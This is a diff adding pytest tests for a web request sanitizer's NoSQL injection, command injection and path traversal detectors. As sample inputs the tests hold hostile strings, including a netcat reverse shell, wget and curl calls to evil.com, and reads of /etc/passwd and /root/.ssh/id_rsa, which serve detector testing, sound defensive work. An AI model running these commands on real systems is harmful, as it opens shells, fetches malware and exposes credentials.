@@ -1,8 +1,16 @@
 """Tests for the sanitization module."""
 
 import pytest
+from fastapi import FastAPI
+from httpx import ASGITransport, AsyncClient
 
+from araxys.core.config import SanitizeConfig
 from araxys.core.exceptions import SanitizationError
+from araxys.sanitize.detectors import (
+    detect_command_injection,
+    detect_nosql_injection,
+    detect_path_traversal,
+)
 from araxys.sanitize.filters import (
     detect_sqli,
     detect_xss,
@@ -10,6 +18,7 @@ from araxys.sanitize.filters import (
     sanitize_value,
     strip_xss,
 )
+from araxys.sanitize.scanner import scan_value
 
 
 class TestSQLiDetection:
@@ -122,3 +131,338 @@ class TestSanitizePayload:
         data = {"count": 42, "active": True, "ratio": 3.14, "nothing": None}
         result = sanitize_payload(data)
         assert result == data
+
+
+class TestNoSQLInjectionDetection:
+    """Tests for NoSQL injection detection (Task 6.1)."""
+
+    def test_detects_where_operator(self) -> None:
+        assert detect_nosql_injection('{"$where": "sleep(5000)"}') is not None
+
+    def test_detects_gt_operator(self) -> None:
+        assert detect_nosql_injection('{"$gt": ""}') is not None
+
+    def test_detects_ne_operator(self) -> None:
+        assert detect_nosql_injection('username[$ne]=admin') is not None
+
+    def test_detects_regex_operator(self) -> None:
+        assert detect_nosql_injection('{"$regex": ".*"}') is not None
+
+    def test_detects_nin_operator(self) -> None:
+        assert detect_nosql_injection('{"$nin": ["a", "b"]}') is not None
+
+    def test_detects_or_operator(self) -> None:
+        assert detect_nosql_injection('{"$or": [{"$gt": ""}]}') is not None
+
+    def test_detects_and_operator(self) -> None:
+        assert detect_nosql_injection('{"$and": [{"$gt": ""}]}') is not None
+
+    def test_detects_eq_operator(self) -> None:
+        assert detect_nosql_injection('password[$eq]=secret') is not None
+
+    def test_detects_prefixless_gt(self) -> None:
+        assert detect_nosql_injection('{"gt": ""}') is not None
+
+    def test_detects_prefixless_ne(self) -> None:
+        assert detect_nosql_injection('{"ne": "admin"}') is not None
+
+    def test_detects_prefixless_regex(self) -> None:
+        assert detect_nosql_injection('{"regex": ".*"}') is not None
+
+    def test_clean_string_passes(self) -> None:
+        assert detect_nosql_injection("Hello, this is a normal message") is None
+
+    def test_clean_json_passes(self) -> None:
+        assert detect_nosql_injection('{"name": "John", "age": 30}') is None
+
+    def test_clean_query_param_passes(self) -> None:
+        assert detect_nosql_injection("username=john&age=30") is None
+
+    def test_detects_nosql_in_url_encoded_value(self) -> None:
+        assert detect_nosql_injection('user[$where]=1') is not None
+
+
+class TestCommandInjectionDetection:
+    """Tests for OS command injection detection (Task 6.2)."""
+
+    def test_detects_semicolon_separator(self) -> None:
+        assert detect_command_injection("1; ls -la") is not None
+
+    def test_detects_pipe_operator(self) -> None:
+        assert detect_command_injection("cat /etc/passwd | grep root") is not None
+
+    def test_detects_double_pipe(self) -> None:
+        assert detect_command_injection("rm file || echo done") is not None
+
+    def test_detects_double_ampersand(self) -> None:
+        assert detect_command_injection("rm file && echo done") is not None
+
+    def test_detects_backtick_substitution(self) -> None:
+        assert detect_command_injection("echo `whoami`") is not None
+
+    def test_detects_dollar_paren_substitution(self) -> None:
+        assert detect_command_injection("echo $(whoami)") is not None
+
+    def test_detects_wget_command(self) -> None:
+        assert detect_command_injection("wget http://evil.com/malware") is not None
+
+    def test_detects_curl_command(self) -> None:
+        assert detect_command_injection("curl http://evil.com") is not None
+
+    def test_detects_bash_command(self) -> None:
+        assert detect_command_injection("bash -c 'evil'") is not None
+
+    def test_detects_nc_command(self) -> None:
+        assert detect_command_injection("nc -e /bin/sh 10.0.0.1 4444") is not None
+
+    def test_detects_url_encoded_semicolon(self) -> None:
+        assert detect_command_injection("cmd%3Bls") is not None
+
+    def test_detects_url_encoded_pipe(self) -> None:
+        assert detect_command_injection("cmd%7Cls") is not None
+
+    def test_detects_null_byte(self) -> None:
+        assert detect_command_injection("cmd.exe\x00.exe") is not None
+
+    def test_detects_powershell_command(self) -> None:
+        assert detect_command_injection("powershell -Command Invoke-Expression") is not None  # noqa: E501
+
+    def test_detects_cmd_exe(self) -> None:
+        assert detect_command_injection("cmd /c dir") is not None
+
+    def test_clean_text_passes(self) -> None:
+        assert detect_command_injection("Hello, this is a normal message") is None
+
+    def test_clean_url_passes(self) -> None:
+        assert detect_command_injection("https://example.com/page?q=search") is None
+
+    def test_clean_filename_passes(self) -> None:
+        assert detect_command_injection("my_report_v2_final.pdf") is None
+
+
+class TestPathTraversalDetection:
+    """Tests for path traversal detection (Task 6.3)."""
+
+    def test_detects_unix_dotdot_slash(self) -> None:
+        assert detect_path_traversal("../../../etc/passwd") is not None
+
+    def test_detects_windows_dotdot_backslash(self) -> None:
+        assert detect_path_traversal("..\\..\\windows\\system32") is not None
+
+    def test_detects_etc_passwd(self) -> None:
+        assert detect_path_traversal("/etc/passwd") is not None
+
+    def test_detects_var_log(self) -> None:
+        assert detect_path_traversal("/var/log/auth.log") is not None
+
+    def test_detects_url_encoded_traversal(self) -> None:
+        assert detect_path_traversal("%2e%2e%2f%2e%2e%2fetc/passwd") is not None
+
+    def test_detects_partial_url_encoded(self) -> None:
+        assert detect_path_traversal("%2e%2e/etc/passwd") is not None
+
+    def test_detects_mixed_encoding(self) -> None:
+        assert detect_path_traversal("..%2f..%2fetc/passwd") is not None
+
+    def test_detects_double_encoded(self) -> None:
+        assert detect_path_traversal("%252e%252e%252fetc/passwd") is not None
+
+    def test_detects_windows_drive_letter(self) -> None:
+        assert detect_path_traversal("C:\\Windows\\system32") is not None
+
+    def test_detects_unc_path(self) -> None:
+        assert detect_path_traversal("\\\\server\\share\\file") is not None
+
+    def test_detects_null_byte_path(self) -> None:
+        assert detect_path_traversal("file.txt%00.html") is not None
+
+    def test_clean_normal_path_passes(self) -> None:
+        assert detect_path_traversal("/api/users/123/profile") is None
+
+    def test_clean_filename_passes(self) -> None:
+        assert detect_path_traversal("report_2024_final.pdf") is None
+
+    def test_clean_query_string_passes(self) -> None:
+        assert detect_path_traversal("page=1&limit=20") is None
+
+    def test_detects_proc_path(self) -> None:
+        assert detect_path_traversal("/proc/self/environ") is not None
+
+    def test_detects_root_path(self) -> None:
+        assert detect_path_traversal("/root/.ssh/id_rsa") is not None
+
+
+# ---------------------------------------------------------------------------
+# Fixtures for scanner + middleware integration
+# ---------------------------------------------------------------------------
+
+
+@pytest.fixture
+def sanitize_config() -> SanitizeConfig:
+    """SanitizeConfig with all new checks enabled."""
+    return SanitizeConfig(
+        block_sqli=False,
+        strip_xss=False,
+        scan_query_params=True,
+        scan_headers=True,
+        check_nosql_injection=True,
+        check_command_injection=True,
+        check_path_traversal=True,
+    )
+
+
+@pytest.fixture
+def scanner_app(sanitize_config: SanitizeConfig) -> FastAPI:
+    """FastAPI app with SanitizeMiddleware for integration testing."""
+    from araxys.sanitize.middleware import SanitizeMiddleware
+
+    app = FastAPI()
+
+    @app.get("/test")
+    async def test_get() -> dict:
+        return {"status": "ok"}
+
+    @app.post("/body")
+    async def test_post() -> dict:
+        return {"status": "ok"}
+
+    app.add_middleware(SanitizeMiddleware, config=sanitize_config)
+    return app
+
+
+@pytest.fixture
+async def scanner_client(scanner_app: FastAPI) -> AsyncClient:
+    """Async HTTP client for scanner integration tests."""
+    transport = ASGITransport(app=scanner_app)
+    async with AsyncClient(transport=transport, base_url="http://test") as c:
+        yield c
+
+
+# ---------------------------------------------------------------------------
+# Scanner Unit Tests (Tasks 6.4 + 6.5)
+# ---------------------------------------------------------------------------
+
+
+class TestScanValue:
+    """Unit tests for scan_value() — applies all enabled detectors."""
+
+    def test_detects_nosql(self) -> None:
+        config = SanitizeConfig(
+            check_nosql_injection=True,
+            check_command_injection=False,
+            check_path_traversal=False,
+        )
+        assert scan_value('{"$gt": ""}', config) is not None
+
+    def test_detects_command_injection(self) -> None:
+        config = SanitizeConfig(
+            check_nosql_injection=False,
+            check_command_injection=True,
+            check_path_traversal=False,
+        )
+        assert scan_value("1; ls -la", config) is not None
+
+    def test_detects_path_traversal(self) -> None:
+        config = SanitizeConfig(
+            check_nosql_injection=False,
+            check_command_injection=False,
+            check_path_traversal=True,
+        )
+        assert scan_value("../../../etc/passwd", config) is not None
+
+    def test_skips_disabled_checks(self) -> None:
+        config = SanitizeConfig(
+            check_nosql_injection=False,
+            check_command_injection=False,
+            check_path_traversal=False,
+        )
+        assert scan_value("../../../etc/passwd", config) is None
+
+    def test_url_decoded_values_are_scanned(self) -> None:
+        config = SanitizeConfig(
+            check_nosql_injection=True,
+            check_command_injection=False,
+            check_path_traversal=False,
+        )
+        assert scan_value("%7B%22%24gt%22%3A%20%22%22%7D", config) is not None
+
+    def test_first_detector_wins(self) -> None:
+        """When multiple checks enabled, the first matched threat is returned."""
+        config = SanitizeConfig(
+            check_nosql_injection=True,
+            check_command_injection=True,
+            check_path_traversal=True,
+        )
+        result = scan_value("../../../etc/passwd", config)
+        assert result is not None
+        # The order is: nosql → cmd → path_traversal
+        # Path traversal should match here
+        assert "traversal" in result or "traversal" in result
+
+
+class TestScanQueryParams:
+    """Tests for scan_query_params()."""
+
+    async def test_clean_params_pass(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
+        resp = await scanner_client.get("/test?name=john&age=30")
+        assert resp.status_code == 200
+
+    async def test_detects_nosql_in_query(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
+        resp = await scanner_client.get("/test?username[$ne]=admin")
+        assert resp.status_code == 400
+        body = resp.json()
+        assert "detail" in body
+
+    async def test_detects_command_in_query(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
+        resp = await scanner_client.get("/test?cmd=1; ls -la")
+        assert resp.status_code == 400
+
+    async def test_detects_path_traversal_in_query(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
+        resp = await scanner_client.get("/test?file=../../../etc/passwd")
+        assert resp.status_code == 400
+
+    async def test_url_encoded_attack_in_query(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
+        resp = await scanner_client.get("/test?cmd=cmd%3Bls")
+        assert resp.status_code == 400
+
+
+class TestScanHeaders:
+    """Tests for scan_headers()."""
+
+    async def test_clean_headers_pass(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
+        resp = await scanner_client.get("/test", headers={"X-Custom": "hello"})
+        assert resp.status_code == 200
+
+    async def test_detects_nosql_in_header(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
+        resp = await scanner_client.get("/test", headers={"X-Auth": '{"$gt": ""}'})
+        assert resp.status_code == 400
+
+    async def test_detects_command_in_header(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
+        resp = await scanner_client.get("/test", headers={"X-Cmd": "1; ls -la"})
+        assert resp.status_code == 400
+
+    async def test_detects_path_traversal_in_header(self, sanitize_config: SanitizeConfig, scanner_app: FastAPI, scanner_client: AsyncClient) -> None:  # noqa: E501
+        resp = await scanner_client.get(
+            "/test", headers={"X-File": "../../../etc/passwd"}
+        )
+        assert resp.status_code == 400
+
+    async def test_disabled_scanner_does_not_block(self) -> None:
+        config = SanitizeConfig(
+            scan_query_params=False,
+            scan_headers=False,
+            check_nosql_injection=True,
+        )
+        from araxys.sanitize.middleware import SanitizeMiddleware
+
+        app = FastAPI()
+
+        @app.get("/test")
+        async def root() -> dict:
+            return {"status": "ok"}
+
+        app.add_middleware(SanitizeMiddleware, config=config)
+        transport = ASGITransport(app=app)
+        async with AsyncClient(transport=transport, base_url="http://test") as c:
+            resp = await c.get("/test?username[$ne]=admin")
+            assert resp.status_code == 200
